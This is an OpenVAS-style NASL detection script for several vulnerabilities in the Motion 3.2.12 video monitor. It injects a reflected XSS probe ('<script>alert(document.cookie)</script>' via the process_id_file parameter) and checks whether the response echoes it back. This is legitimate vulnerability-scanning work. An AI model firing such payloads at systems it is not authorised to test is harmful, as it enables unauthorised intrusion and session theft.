# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903313");
  script_version("2022-02-14T13:47:12+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-02-14 13:47:12 +0000 (Mon, 14 Feb 2022)");
  script_tag(name:"creation_date", value:"2013-06-28 10:45:03 +0530 (Fri, 28 Jun 2013)");
  script_name("Motion Camera Video Signal Monitor Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122171/motion3212-sqlxssxsrfoverflow.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/motion-3212-xss-csrf-buffer-overflow-sql-injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
HTML and script code in a user's browser session in context of an affected site,
and cause denial of service condition.");
  script_tag(name:"affected", value:"Motion version 3.2.12");
  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Improper validation of user supplied to the motion binary via 'pid' and
'filename' parameters.

  - Input passed via 'process_id_file', 'control_authentication' and 'sql_query'
parameters to /config/set page is not properly sanitized before being returned
to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"Motion Video Signal Monitor is prone to multiple vulnerabilities.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

if(http_vuln_check(port:port, url: "/", usecache:TRUE,
   pattern:">Motion", check_header:TRUE, extra_check:">All<"))
{
  url = "/0/config/set?process_id_file=</li><script>alert(document.cookie);</script><li>";

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<script>alert\(document\.cookie\);</script>",
     extra_check:">process_id_file"))
  {
    security_message(port);
    exit(0);
  }
}
